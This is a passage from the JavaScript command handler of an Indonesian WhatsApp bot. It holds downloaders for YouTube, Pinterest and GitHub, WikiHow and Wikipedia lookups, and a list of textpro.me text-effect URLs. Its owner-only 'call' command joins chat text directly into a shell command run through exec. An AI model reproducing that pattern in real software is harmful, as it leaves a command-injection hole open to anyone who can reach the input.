a = await conn.sendMessage(m.chat, {text: "Succes"})
b = await conn.sendMessage(m.chat, {react: {text: "🗿", key: { remoteJid: m.chat, fromMe: true, id: a.key.id }}})
conn.sendMessage(`${text.split("+")[1]}@s.whatsapp.net`, {text: "."}, {quoted: b})
} else if(m.quoted) {
a = await conn.sendMessage(m.chat, {text: "Succes"})
b = await conn.sendMessage(m.chat, {react: {text: "🗿", key: { remoteJid: m.chat, fromMe: true, id: a.key.id }}})
conn.sendMessage(quoted.sender, {text: "."}, {quoted: b})
} else {
m.reply("Dibutuhkan id Room")
}
} catch (e) {
m.reply("error")
}
}
break




case 'ytmp3': 
case 'ytaudio': {

try {
if(text.includes("youtu")) {
let { yta } = require('./lib/y2mate')
if(text.length < 1) return m.reply(`Contoh : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 360p`)
/*let quality = args[1] ? args[1] : '360p'*/
await yta(text).then(async res => {
let ythumb = await getBuffer(res.thumb)
if (res.filesize >= 20000) return m.reply('File Melebihi Batas, maximal 10mb')
await conn.sendMessage(m.chat, { document: { url: res.dl_link }, mimetype: 'audio/mpeg', fileName: `${res.title}.mp3`,contextInfo: {externalAdReply: {title: `${res.title}`, body: "©Perwira Bot WhatsApp", mediaUrl: text, sourceUrl: text, mediaType: 2, showAdAttribution: true, thumbnail: ythumb}}}, {}).catch((e) => m.reply(String(e)))
/*conn.sendButDoc2(m.chat, "©Perwira Bot WhatsApp", '*Click Document untuk download*\n\n*Lokasi file*\nAndroid/media/com.whatsapp/WhatsApp/Media/WhatsApp Documents', `${res.title}`, "©Perwira Bot WhatsApp", ythumb, text, 2, `${res.title}.mp3` , res.dl_link, "audio/mpeg", [{ buttonId: 'ok', buttonText: { displayText: 'Thanks' }, type: 1 }], m)*/
})
} else {
m.reply(`Masukkan link YouTube.\n*Contoh :* ${prefix+command} https://youtu.be/FIeUzNdApMA`)
}
} catch(e) {
try {

let { yta } = require('./lib/y2mate')
await yta(text).then(async res => {
let ythumb = await getBuffer(res.thumb)
if (res.filesize >= 20000) return m.reply('File Melebihi Batas, maximal 10mb')
await conn.sendMessage(m.chat, { document: { url: res.dl_link }, mimetype: 'audio/mpeg', fileName: `${res.title}.mp3`,contextInfo: {externalAdReply: {title: `${res.title}`, body: "©Perwira Bot WhatsApp", mediaUrl: text, sourceUrl: text, mediaType: 2, showAdAttribution: true, thumbnail: ythumb}}}, {}).catch((e) => m.reply(String(e)))
/*conn.sendButDoc2(m.chat, "©Perwira Bot WhatsApp", '*Click Document untuk download*\n\n*Lokasi file*\nAndroid/media/com.whatsapp/WhatsApp/Media/WhatsApp Documents', `${res.title}`, "©Perwira Bot WhatsApp", ythumb, text, 2, `${res.title}.mp3` , res.dl_link, "audio/mpeg", [{ buttonId: 'ok', buttonText: { displayText: 'Thanks' }, type: 1 }], m)*/
})
} catch(e) {
m.reply("Maaf coba lagi beberapa saat\n"+String(e))
}
}

}break




case 'ytmp4': 
case 'ytvideo': {

try {
if(text.includes("youtu")) {
let { ytv } = require('./lib/y2mate')
if(text.length < 1) return m.reply(`Contoh : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 360p`)
/*let quality = args[1] ? args[1] : '360p'*/

let res = await ytv(text)
let ythum = await getBuffer(res.thumb)
if (res.filesize >= 20000) return m.reply('File Melebihi Batas, maximal 20mb')
conn.sendMessage(m.chat, { document: { url: res.dl_link }, mimetype: 'video/mp4', fileName: `${res.title}.mp4`,contextInfo: {externalAdReply: {title: `${res.title}`, body: "©Perwira Bot WhatsApp", mediaUrl: text, sourceUrl: text, mediaType: 2, showAdAttribution: true, thumbnail: ythum}}},{})
/*conn.sendButDoc2(m.chat, "©Perwira Bot WhatsApp", '*Click Document untuk download*\n\n*Lokasi file*\nAndroid/media/com.whatsapp/WhatsApp/Media/WhatsApp Documents', `${res.title}`, "©Perwira Bot WhatsApp", ythum, text, 2, `${res.title}.mp4` , res.dl_link, "video/mp4", [{ buttonId: 'ok', buttonText: { displayText: 'Thanks' }, type: 1 }], m)*/
} else {
m.reply(`Masukkan link YouTube.\n*Contoh :* ${prefix+command} https://youtu.be/FIeUzNdApMA`)
}
} catch(e) {
try {
let { ytv } = require('./lib/y2mate')
let res = await ytv(text)
let ythum = await getBuffer(res.thumb)
if (res.filesize >= 20000) return m.reply('File Melebihi Batas, maximal 20mb')
conn.sendMessage(m.chat, { document: { url: res.dl_link }, mimetype: 'video/mp4', fileName: `${res.title}.mp4`,contextInfo: {externalAdReply: {title: `${res.title}`, body: "©Perwira Bot WhatsApp", mediaUrl: text, sourceUrl: text, mediaType: 2, showAdAttribution: true, thumbnail: ythum}}},{})
} catch(e) {
m.reply("Maaf coba lagi beberapa saat\n"+String(e))
}
}
}break



case 'call':{
if(!isCreator) return m.reply("Khusus Owner")
if(text.includes("@")) {
exec("python call.py "+text.split("@62")[1], (err, stdout) => {
if(err) return m.reply(err)
if (stdout) return m.reply(stdout)
})
} else if(text.startsWith("8")) {
exec("python call.py "+text, (err, stdout) => {
if(err) return m.reply(err)
if (stdout) return m.reply(stdout)
})
} else {
m.reply(`Masukkan nomor contoh\n${prefix+command} 852+++++++++\natau\nTag nomor demgan cara\n${prefix+command} tag nomor`)
}
}
break




case 'wikihow': {
if (!isCreator && m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
if(text.length < 1) return m.reply("*Contoh:* /wikihow cara tidur")
try {
let { wihow } = require("./lib/wikihow")
let { wikihow } = require("./lib/wikihow")
if(text.includes("¢d")) {
nup = 1
klo = await wikihow(text.split("¢")[0])
din = klo
wikuhh = din[1].step[text.split("¢d")[1] ? text.split("¢d")[1] : 0].name;
wikuuh = din[1].step[text.split("¢d")[1] ? text.split("¢d")[1] : 0].itemListElement;

(async () => {
for(let wi of wikuuh) {
await sleep(3000)
conn.linkUp(m.chat, `*${nup++}.* ${wi.text}`, wi.url, await getBuffer(wi.image), wikuhh, 'Wikihow bahasa Indonesia')
}
})().then(() => {conn.sendMessage(m.chat, {text: "Kembali pilih step jika ingin melihat bagian tips selanjutnya"}, {quoted: m.quoted.fakeObj})
})
} else if(text.includes("https://id.wikihow.com")) {
/*hw = ``
wikuh = await wikihow(text)
for(let wio of wikuh) {
hw += `*${wio.title}*
${wio.data}\n\n`
}
conn.sendMessage(m.chat, {text: hw, contextInfo: {externalAdReply: {title: "Wikihow", body: "©Perwira Bot WhatsApp", sourceUrl: text, mediaUrl: text, mediaType: 1, renderLargerThumbnail: true, thumbnail: fs.readFileSync(`./image/howiki.png`)}}})*/
ii = 1
nup = 1
kl = await wikihow(text.split("¢")[0])
hui = 0
dn = kl
wikhh = dn[1].step[text.split("¢d")[1] ? text.split("¢d")[1] : 0].name
wikh = dn[1].step[text.split("¢")[1]]
wikhih = dn[1].step
wikuh = dn[1].step[text.split("¢d")[1] ? text.split("¢d")[1] : 0].itemListElement 

mnaw = []
let listhow = {
text: 'Step bagian',
footer: `©Perwira Bot WhatsApp`,
title: `Wikihow`,
buttonText: "Catatan yang ditemukan",
sections: [{
"title": `Hasil penelusuran yang ditemukan`,
"rows": mnaw}]
}
for(let g of wikhih) {
mnaw.push({
"title": `${ii++}.${g.name}`,
"description": `Step step lanjutan ${dwt[0].title}`,
"rowId": `wikihow ${text}¢d${hui++}`
})
}
(async () => {
for(let wi of wikuh) {
await sleep(3000)
conn.linkUp(m.chat, `*${nup++}.* ${wi.text}`, wi.url, await getBuffer(wi.image), wikhh, 'Wikihow bahasa Indonesia')
}
})().then(() => {(async () => {await sleep(2000)})()}).then(() => {conn.sendMessage(m.chat, listhow, {quoted: 
{
key: { fromMe: false, participant: `${quoted.sender}`},
message: {
"extendedTextMessage": {
"text": `*Wikihow*`,
"title": ``,
'jpegThumbnail': fs.readFileSync('./image/how2.png')
}} 
}, contextInfo: {mentionedJid: [quoted.sender]}})
})
} else {
dwt = await wihow(text)
datp = await wikihow(dwt[0].link)
kun = datp
wikhh = kun[1].step[0].name
wikh = kun[1].step[0]
wikhih = kun[1].step


dat = `${wikhh}`

mnaw = []
mehow = []
nii = 1
ii = 1
hui = 0
for(let l of dwt) {
mehow.push({
"title": `${nii++}.${l.title}`,
"description": `• update: ${l.date}\n• view: ${l.view}`,
"rowId": `wikihow ${l.link}¢0`
})
}
/*for(let g of wikhih) {
mnaw.push({
"title": `${ii++}.${g.name}`,
"description": `Step step lanjutan ${dwt[0].title}`,
"rowId": `wikihow ¢${hui++}`
})
}*/

let listhow = {
text: 'Hasil penelusuran',
footer: `©Perwira Bot WhatsApp`,
title: `Wikihow`,
buttonText: "Catatan yang ditemukan",
sections: [{
"title": `Hasil penelusuran yang ditemukan`,
"rows": mnaw}]
}
let yu = {
text: 'List hasil penelusuran',
footer: `©Perwira Bot WhatsApp`,
title: `Wikihow`,
buttonText: "Catatan yang ditemukan",
sections: [{
"title": `Hasil penelusuran yang ditemukan`,
"rows": mehow}]
}

/*conn.sendMessage(m.chat, {text: dat, contextInfo: {externalAdReply: {title: "Wikihow", body: "©Perwira Bot WhatsApp", sourceUrl: `${dwt[0].link}`, mediaUrl: `${dwt[0].link}`, mediaType: 1, renderLargerThumbnail: true, thumbnail: fs.readFileSync(`./image/howiki.png`)}}})*/
conn.sendMessage(m.chat, yu, {quoted: {
key: { fromMe: false, participant: `${quoted.sender}`},
message: {
"extendedTextMessage": {
"text": `*Wikihow*`,
"title": ``,
'jpegThumbnail': fs.readFileSync('./image/how2.png')
}} 
}, contextInfo: {mentionedJid: [quoted.sender]}})
}
} catch(e) {
m.reply(String(e))
}
}
break




case 'wikihow2': {
if(text.length < 1) return m.reply("*Contoh:* /wikihow cara tidur")
try {
let { wihow } = require("./lib/wikihow")
let { wikihow } = require("./lib/wikihow")

dun = await wihow(text)
h = await wikihow(dun[0].link).then(() => {m.reply("ok")})

k = h[1].step[0]
for(let wi of k.itemListElement) {
await sleep(2000)
conn.linkUp(m.chat, `${wi.text}`, wi.url, await getBuffer(wi.image), "Wikipedia", 'Wikihow bahasa Indonesia')
}


} catch (err) {
m.reply(String(err))
}
}
break




case 'wikipedia': {
if(text.length < 1) return m.reply("*Contoh:* /wikipedia apa itu globalisasi")
try {

let { wikipedia } = require('./lib/wikipedia')
let { swiki } = require('./lib/wikipedia')

if(text.includes("https://id.m.wikipedia.org")) {
lw = await wikipedia(text)
dwk = `*${lw.title[0]}*

${lw.result[0].data}`
conn.sendMessage(m.chat, {image: {url: lw.img[0] || "https://github.com/PerwiraKusuma111/PerwiraKusuma111/raw/main/images%20(2)-picsay.png"}, caption: dwk }, {quoted: m})
} else {

swi = await swiki(encodeURI(text))
wikped = await wikipedia(swi[0].data ? swi[0].data: `https://id.m.wikipedia.org/wiki/${text}`)
listmes = []
noi = 1

for(let w of swi) {
listmes.push({
"title": `${noi++}.${w.data.split("/")[4].replace(/_/g, " ")}`,
"description": `Wikiedia result ${w.data.split("/")[4].replace(/_/g, " ")}`,
"rowId": `wikipedia ${w.data}`
})
}

dw = `*${wikped.title[0]}*

${wikped.result[0].data}`

let listMessagew = {
text: 'Hasil penelusuran',
footer: `©Perwira Bot WhatsApp`,
title: `Wikipedia`,
buttonText: "Catatan yang ditemukan",
sections: [{
"title": `Hasil penelusuran yang ditemukan`,
"rows": listmes}]
}
conn.sendMessage(m.chat, {image: {url: wikped.img[0] || "https://github.com/PerwiraKusuma111/PerwiraKusuma111/raw/main/images%20(2)-picsay.png"}, caption: dw }, {quoted: m}).then(() => {conn.sendMessage(m.chat, listMessagew, {quoted: 
{
key: { fromMe: false, participant: `${quoted.sender}`},
message: {
"extendedTextMessage": {
"text": `*Wikipedia*`,
"title": ``,
'jpegThumbnail': fs.readFileSync('./image/wiki.png')
}} 
}, contextInfo: {mentionedJid: [quoted.sender]}})
})

}

} catch(err) {
try {
let { wikipedia } = require('./lib/wikipedia')
lw = await wikipedia("https://id.m.wikipedia.org/wiki/" + text)
dwk = `*${lw.title[0]}*

${lw.result[0].data}`
conn.sendMessage(m.chat, {image: {url: lw.img[0] || "https://github.com/PerwiraKusuma111/PerwiraKusuma111/raw/main/images%20(2)-picsay.png"}, caption: dwk }, {quoted: m})
} catch(err) {
m.reply(String(err))
}
}
}
break


case 'pindl':
case 'pinterest': {

if(text.length < 1) return m.reply(`Masukkan yang ingin dicari\n*Contoh :* ${prefix+command} Naruto atau masukkan Link`)
if(text.includes("https://pin")) {
let dimti = ' '
await axios.post("https://www.expertstool.com/download-pinterest-video/", `url=${text}`).then(({data}) => {dimti = `${data.split(`<td><a href="`)[1].split('" download')[0].split('" target')[0]}`})
if(dimti.endsWith("gif")) {
conn.sendMessage(m.chat, {video: {url: dimti}, gifPlayback: true, caption: "Pinterest Downloader"})
} else if(dimti.endsWith("mp4")) {
let dddi = [{ buttonId: `pinmp333 ${dimti}`, buttonText: { displayText: 'Audio' },type: 1}]
conn.sendButVidc(m.chat, dddi, "*Pinterest Downloader*", '©P-Bot 2022\nThis is simple Bot WhatsApp', `${dimti}`)
/*conn.sendMessage(m.chat, {video: {url: dimti}, videoPlayback: false, caption: "Pinterest Downloader"})*/
}
} else if(!text.includes("https://pin")) {
async function pinterestSearch(query) {
return new Promise((resolve, reject) => {
fetch(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${query}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${query}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`, {
"headers": {
"accept": "application/json, text/javascript, */*, q=0.01",
"accept-language": "en-US,en;q=0.9",
"cache-control": "no-cache",
"pragma": "no-cache",
"sec-fetch-dest": "empty",
"sec-fetch-mode": "cors",
"sec-fetch-site": "same-origin",
"sec-gpc": "1",
"x-app-version": "9a236a4",
"x-pinterest-appstate": "active",
"x-requested-with": "XMLHttpRequest"
},
"referrer": "https://www.pinterest.com/",
"referrerPolicy": "origin",
"body": null,
"method": "GET",
"mode": "cors"
}).then((res) => res.json())
.then((json) => {
const generatepin = json.resource_response.data.results[Math.floor(Math.random() * (json.resource_response.data.results.length))]
var result = [];
result.push({
link: generatepin.images.orig.url
})
resolve(result)
}).catch(reject)
})
}

const pinterest = (query) => new Promise((resolve, reject) => {
pinterestSearch(query).then((data) => {
resolve({
status: 200,
image: data[0].link
})
}).catch(reject)
})

pinterest(q).then(async res => {
/*	let we = await getBuffer(res.image).catch(err => reply(`*Error*
${util.format(err)}`))*/
conn.sendMessage(m.chat, {image: {url : res.image}, caption: `Random search image from Pinterest`}, {quoted: m}).catch(e => m.reply(`*Error* ${String(e)}`))
}).catch(e => m.reply(`*Error* ${String(e)}`))
}
}
break



case 'pinmp333': {
let media = await getBuffer(text)
let { toAudio } = require('./lib/converter')
let audii = await toAudio(media, 'mp4')
conn.sendMessage(m.chat, {document: audii, ptt: false, mimetype: 'audio/mpeg', fileName: `Pinterest audio ${new Date() * 1}.mp3`, contextInfo: {mentionedJid: [quoted.sender], externalAdReply: {title: `Pinterest Downloader`, body: "©Perwira Bot WhatsApp", mediaUrl: text, sourceUrl: text, mediaType: 1, renderLargerThumbnail: true, showAdAttribution: true, thumbnail: fs.readFileSync('./image/pin.png')}}})
}
break


case 'ghdl': 
case 'github': {
if(!text.includes("https://github.com")) return m.reply("Masukkan link dengan benar!\n*Contoh:* /github https://github.com/DARK-02/DarkBotMD")
if(!text.split("/")[4]) return
try {
conn.sendMessage(m.chat, {document: {url: text + "/archive/refs/heads/main.zip"}, mimetype: 'application/zip', fileName: `${text}.zip`, contextInfo: {externalAdReply: {title: "Github Download", body: "©Perwira Bot WhatsApp", sourceUrl: text, mediaUrl: text, mediaType: 1, renderLargerThumbnail: true, thumbnail: fs.readFileSync(`./image/gh.png`)}}}, {quoted: m})
} catch(e) {
m.reply(String(e))
}
}
break


case 'textpro':{
let typetext = `*List type*

*1*. sketch
*2*. magma
*3*. stone
*4*. glitch
*5*. retro
*6*. glass
*7*. papercut
*8*. papercolor
*9*. chrome
*10*. wings
*11*. bear
*12*. graffititext
*13*. ice
*14*. luxurygold
*15*. sand
*16*. tiktokglitch
*17*. tahun
*18*. neon
*19*. galaxywolf
*20*. ninja
*21*. matrix
*22*. thunderl
*23*. dropwater

*Baru ditambahkan*
Error? lapor owner

*1*. dmetal
*2*. whitegold
*3*. dgiraffe
*4*. lightglow
*5*. texteffects
*6*. batman
*7*. dretro
*8*. thorlogo
*9*. lightglitch
*10*. neonlight
*11*. glowingneon
*12*. goldenancient
*13*. leddisplay
*14*. newyear
*15*. treetext
*16*. christmascandy
*17*. christmastext
*18*. merrychristmas
*19*. ddeep
*20*. onlinecountry
*21*. americanflag
*22*. dsci
*23*. rainbowcolor
*24*. dwater
*25*. halloweenskeleton
*26*. spooky
*27*. cinematic
*28*. sketch
*29*. bluecircuit
*30*. spacetext
*31*. metallic
*32*. captain
*33*. ciencefiction
*34*. gameclassic
*35*. greenhorror
*36*. transformer
*37*. berrytext
*38*. layeredtext
*39*. thundertext
*40*. magma
*41*. stonecracked
*42*. dneon
*43*. impressive
*44*. glitch
*45*. glitch
*46*. harrypotter
*47*. embossedtext
*48*. glasstext
*49*. artpaper
*50*. dgradient
*51*. marveltext
*52*. dglossy
*53*. drealistic
*54*. watercolor
*55*. multicolor3d
*56*. hororblood
*57*. neondevil
*58*. underwatertext
*59*. blackand
*60*. wonderfulgraffiti
*61*. graffiti
*62*. graffitiwall
*63*. christmas
*64*. futuristic
*65*. snowtext
*66*. cloud
*67*. luxurygold
*68*. gradienttext
*69*. blackpinklogo
*70*. realisticvintage
*71*. realisticcloud
*72*. cloudfly
*73*. insand
*74*. writingtext
*75*. engraved3d
*76*. summery
*77*. glowingmetal
*78*. dglue
*79*. space3d
*80*. darkgold
*81*. glitchtext
*82*. stone
*83*. lighttext
*84*. matrixtext
*85*. minioneffect
*86*. pornhub
*87*. dholotext
*88*. avengers
*89*. purpledual
*90*. marvelstyle
*91*. silvertext
*92*. fullluxury
*93*. bluemetal
*94*. goldtext
*95*. carbontext
*96*. fabriceffect
*97*. tneoneffect
*98*. yearcards
*99*. metaltextlogo
*100*. avatargold
*101*. logo3d
*102*. cards3d
*103*. firetext
*104*. lionlogo
*105*. wolflogo
*106*. wolfglogo
*107*. ninjalogo
*108*. logojoker
*109*. wickereffect
*110*. leavestext
*111*. sparkletext
*112*. skeletoneffect
*113*. foilballoon
*114*. steeleffect
*115*. glosstext
*116*. denimeffect
*117*. greentext
*118*. purpletext
*119*. stonetext
*120*. rockeffect
*121*. lavaeffect
*122*. shinyglass
*123*. americatext
*124*. robotd2
*125*. equalizertext
*126*. toxiceffect
*127*. sparklingjewelry
*128*. caketext
*129*. berryeffect
*130*. fishtext
*131*. breadeffect
*132*. bloodtext
*133*. boxtext
*134*. neoneffect
*135*. warningtext
*136*. steeltext
*137*. bokeheffect
*138*. neontext
*139*. advancedglow
*140*. watereffect
*141*. walltext
*142*. gifttext
*143*. honeyeffect
*144*. bagdrug
*145*. horrortext
*146*. slabstext
*147*. marbleeffect
*148*. coldtext
*149*. juicetext
*150*. metaltext
*151*. biscuiteffect
*152*. bageleffect
*153*. woodeffect
*154*. fitext
*155*. rainbowtext
*156*. gemtext
*157*. jewelrytext
*158*. goldentext
*159*. carboneffect
*160*. candytext
*161*. glowingmetal`
if(!text.includes("/")) return m.reply(`Cara menggunakan
*Contoh :* ${prefix+command} magma/Text

Type yang tersedia

${typetext}`)
tex = args.join(" ")
jenis = tex.split("/")[0]
isi = tex.split("/")[1]
isi2 = tex.split("/")[2]
let { textpro } = require('mumaker')

let dmetal = `https://textpro.me/create-a-3d-luxury-metallic-text-effect-for-free-1071.html`
let whitegold = `https://textpro.me/elegant-white-gold-3d-text-effect-online-free-1070.html`
let dgiraffe = `https://textpro.me/create-3d-giraffe-text-effect-online-1069.html`
let lightglow = `https://textpro.me/create-light-glow-sliced-text-effect-online-1068.html`
let texteffects = `https://textpro.me/create-text-effects-arcane-tv-series-online-1067.html`
let batman = `https://textpro.me/make-a-batman-logo-online-free-1066.html`
let dretro = `https://textpro.me/create-3d-retro-text-effect-online-free-1065.html`
let thorlogo = `https://textpro.me/create-thor-logo-style-text-effect-online-1064.html`
let lightglitch = `https://textpro.me/neon-light-glitch-text-generator-online-1063.html`
let neonlight = `https://textpro.me/create-neon-light-on-brick-wall-online-1062.html`
let glowingneon = `https://textpro.me/create-glowing-neon-light-text-effect-online-free-1061.html`
let goldenancient = `https://textpro.me/3d-golden-ancient-text-effect-online-free-1060.html`
let leddisplay = `https://textpro.me/color-led-display-screen-text-effect-1059.html`
let newyear = `https://textpro.me/happy-new-year-2022-greeting-3d-card-1058.html`
let treetext = `https://textpro.me/christmas-tree-text-effect-online-free-1057.html`
let christmascandy = `https://textpro.me/create-christmas-candy-cane-text-effect-1056.html`
let christmastext = `https://textpro.me/3d-christmas-text-effect-by-name-1055.html`
let merrychristmas = `https://textpro.me/sparkles-merry-christmas-text-effect-1054.html`
let ddeep = `https://textpro.me/create-3d-deep-sea-metal-text-effect-online-1053.html`
let onlinecountry = `https://textpro.me/free-online-country-flag-3d-text-effect-generator-1052.html`
let americanflag = `https://textpro.me/create-american-flag-3d-text-effect-online-1051.html`
let dsci = `https://textpro.me/create-3d-sci-fi-text-effect-online-1050.html`
let rainbowcolor = `https://textpro.me/3d-rainbow-color-calligraphy-text-effect-1049.html`
let dwater = `https://textpro.me/create-3d-water-pipe-text-effects-online-1048.html`
let halloweenskeleton = `https://textpro.me/create-halloween-skeleton-text-effect-online-1047.html`
let spooky = `https://textpro.me/create-a-spooky-halloween-text-effect-online-1046.html`
let cinematic = `https://textpro.me/create-a-cinematic-horror-text-effect-1045.html`
let sketch = `https://textpro.me/create-a-sketch-text-effect-online-1044.html`
let bluecircuit = `https://textpro.me/create-blue-circuit-style-text-effect-online-1043.html`
let spacetext = `https://textpro.me/create-space-text-effects-online-free-1042.html`
let metallic = `https://textpro.me/create-a-metallic-text-effect-free-online-1041.html`
let glossymetalic = `https://textpro.me/creat-glossy-metalic-text-effect-free-online-1040.html`
let captain = `https://textpro.me/create-a-captain-america-text-effect-free-online-1039.html`
let ciencefiction = `https://textpro.me/create-science-fiction-text-effect-online-free-1038.html`
let gameclassic = `https://textpro.me/video-game-classic-8-bit-text-effect-1037.html`
let greenhorror = `https://textpro.me/create-green-horror-style-text-effect-online-1036.html`
let transformer = `https://textpro.me/create-a-transformer-text-effect-online-1035.html`
let berrytext = `https://textpro.me/create-berry-text-effect-online-free-1033.html`
let layeredtext = `https://textpro.me/create-layered-text-effects-online-free-1032.html`
let thundertext = `https://textpro.me/online-thunder-text-effect-generator-1031.html`
let magma = `https://textpro.me/create-a-magma-hot-text-effect-online-1030.html`
let stonecracked = `https://textpro.me/3d-stone-cracked-cool-text-effect-1029.html`
let dneon = `https://textpro.me/create-3d-neon-light-text-effect-online-1028.html`
let impressiveglitch = `https://textpro.me/create-impressive-glitch-text-effects-online-1027.html`
let glitch = `https://textpro.me/create-a-glitch-text-effect-online-free-1026.html`
let harrypotter = `https://textpro.me/create-harry-potter-text-effect-online-1025.html`
let embossedtext = `https://textpro.me/create-embossed-text-effect-on-cracked-surface-1024.html`
let glasstext = `https://textpro.me/broken-glass-text-effect-free-online-1023.html`
let artpaper = `https://textpro.me/create-art-paper-cut-text-effect-online-1022.html`
let artisticblack = `https://textpro.me/create-artistic-black-and-white-status-and-quote-with-your-photos-1021.html`
let dgradient = `https://textpro.me/online-3d-gradient-text-effect-generator-1020.html`
let dglossy = `https://textpro.me/create-a-3d-glossy-metal-text-effect-1019.html`
let drealistic = `https://textpro.me/create-3d-realistic-text-effect-on-the-beach-online-1018.html`
let watercolor = `https://textpro.me/create-a-free-online-watercolor-text-effect-1017.html`
let multicolor3d = `https://textpro.me/online-multicolor-3d-paper-cut-text-effect-1016.html`
let fogwindow = `https://textpro.me/write-text-on-foggy-window-online-free-1015.html`
let neondevil = `https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html`
let underwatertext = `https://textpro.me/3d-underwater-text-effect-generator-online-1013.html`
let blackand = `https://textpro.me/online-black-and-white-bear-mascot-logo-creation-1012.html`
let wonderfulgraffiti = `https://textpro.me/create-wonderful-graffiti-art-text-effect-1011.html`
let graffiti = `https://textpro.me/create-a-cool-graffiti-text-on-the-wall-1010.html`
let graffitiwall = `https://textpro.me/create-cool-wall-graffiti-text-effect-online-1009.html`
let christmas = `https://textpro.me/create-a-christmas-holiday-snow-text-effect-1007.html`
let futuristic = `https://textpro.me/create-a-futuristic-technology-neon-light-text-effect-1006.html`
let snowtext = `https://textpro.me/create-snow-text-effects-for-winter-holidays-1005.html`
let cloud = `https://textpro.me/create-a-cloud-text-effect-on-the-sky-online-1004.html`
let luxurygold = `https://textpro.me/3d-luxury-gold-text-effect-online-1003.html`
let gradienttext = `https://textpro.me/3d-gradient-text-effect-online-free-1002.html`
let blackpinklogo = `https://textpro.me/create-blackpink-logo-style-online-1001.html`
let realisticvintage = `https://textpro.me/create-realistic-vintage-style-light-bulb-1000.html`
let realisticcloud = `https://textpro.me/create-realistic-cloud-text-effect-online-free-999.html`
let cloudfly = `https://textpro.me/create-a-cloud-text-effect-in-the-sky-online-997.html`
let insand = `https://textpro.me/write-in-sand-summer-beach-free-online-991.html`
let writingtext = `https://textpro.me/sand-writing-text-effect-online-990.html`
let engraved3d = `https://textpro.me/sand-engraved-3d-text-effect-989.html`
let summery = `https://textpro.me/create-a-summery-sand-writing-text-effect-988.html`
let birthday = `https://textpro.me/foil-balloon-text-effect-for-birthday-987.html`
let dglue = `https://textpro.me/create-3d-glue-text-effect-with-realistic-style-986.html`
let space3d = `https://textpro.me/create-space-3d-text-effect-online-985.html`
let darkgold = `https://textpro.me/metal-dark-gold-text-effect-984.html`
let glitchtext = `https://textpro.me/create-glitch-text-effect-style-tik-tok-983.html`
let stone = `https://textpro.me/create-a-stone-text-effect-online-982.html`
let lighttext = `https://textpro.me/neon-light-text-effect-with-galaxy-style-981.html`
let numbtext = `https://textpro.me/1917-style-text-effect-online-980.html`
let sretro = `https://textpro.me/80-s-retro-neon-text-effect-online-979.html`
let minioneffect = `https://textpro.me/minion-text-effect-3d-online-978.html`
let pornhub = `https://textpro.me/pornhub-style-logo-online-generator-free-977.html`
let exposuretext = `https://textpro.me/double-exposure-text-effect-black-white-976.html`
let dholotext = `https://textpro.me/holographic-3d-text-effect-975.html`
let avengers = `https://textpro.me/create-3d-avengers-logo-online-974.html`
let purpledual = `https://textpro.me/metal-purple-dual-effect-973.html`
let marvelstyle = `https://textpro.me/create-logo-style-marvel-studios-online-971.html`
let silvertext = `https://textpro.me/deluxe-silver-text-effect-970.html`
let fullluxury = `https://textpro.me/color-full-luxury-metal-text-effect-969.html`
let bluemetal = `https://textpro.me/glossy-blue-metal-text-effect-967.html`
let dgoldtext = `https://textpro.me/deluxe-gold-text-effect-966.html`
let carbontext = `https://textpro.me/glossy-carbon-text-effect-965.html`
let fabriceffect = `https://textpro.me/fabric-text-effect-online-964.html`
let tneoneffect = `https://textpro.me/neon-text-effect-online-963.html`
let yearcards = `https://textpro.me/new-year-cards-3d-by-name-960.html`
let newfire = `https://textpro.me/happ-new-year-card-firework-gif-959.html`
let balloontext = `https://textpro.me/fullcolor-balloon-text-effect-958.html`
let metaltextlogo = `https://textpro.me/create-text-logo-3d-metal-online-957.html`
let avatargold = `https://textpro.me/create-avatar-gold-online-956.html`
let logo3d = `https://textpro.me/text-logo-3d-metal-galaxy-943.html`
let cards3d = `https://textpro.me/xmas-cards-3d-online-942.html`
let hororblood = `https://textpro.me/blood-text-on-the-frosted-glass-941.html`
let firetext = `https://textpro.me/halloween-fire-text-effect-940.html`
let darkgoldmetal = `https://textpro.me/metal-dark-gold-text-effect-online-939.html`
let lionlogo = `https://textpro.me/create-lion-logo-mascot-online-938.html`
let wolflogo = `https://textpro.me/create-wolf-logo-black-white-937.html`
let wolfgalaxy = `https://textpro.me/create-wolf-logo-galaxy-online-936.html`
let ninjalogo = `https://textpro.me/create-ninja-logo-online-935.html`
let logojoker = `https://textpro.me/create-logo-joker-online-934.html`
let wickereffect = `https://textpro.me/wicker-text-effect-online-932.html`
let leavestext = `https://textpro.me/natural-leaves-text-effect-931.html`
let sparkletext = `https://textpro.me/firework-sparkle-text-effect-930.html`
let skeletoneffect = `https://textpro.me/skeleton-text-effect-online-929.html`
let foilballoon = `https://textpro.me/red-foil-balloon-text-effect-928.html`
let steeleffect = `https://textpro.me/steel-text-effect-online-921.html`
let glosstext = `https://textpro.me/ultra-gloss-text-effect-online-920.html`
let denimeffect = `https://textpro.me/denim-text-effect-online-919.html`
let greentext = `https://textpro.me/decorate-green-text-effect-918.html`
let purpletext = `https://textpro.me/decorate-purple-text-effect-917.html`
let stonetext = `https://textpro.me/peridot-stone-text-effect-916.html`
let rockeffect = `https://textpro.me/rock-text-effect-online-915.html`
let lavaeffect = `https://textpro.me/lava-text-effect-online-914.html`
let yellowglasstext = `https://textpro.me/yellow-glass-text-effect-913.html`
let shinyglass = `https://textpro.me/purple-shiny-glass-text-effect-906.html`
let americatext = `https://textpro.me/captain-america-text-effect-905.html`
let robotd2 = `https://textpro.me/robot-r2-d2-text-effect-903.html`
let equalizertext = `https://textpro.me/rainbow-equalizer-text-effect-902.html`
let toxiceffect = `https://textpro.me/toxic-text-effect-online-901.html`
let sparklingjewelry = `https://textpro.me/pink-sparkling-jewelry-text-effect-899.html`
let decoglasstext = `https://textpro.me/decorative-glass-text-effect-891.html`
let caketext = `https://textpro.me/chocolate-cake-text-effect-890.html`
let berryeffect = `https://textpro.me/strawberry-text-effect-online-889.html`
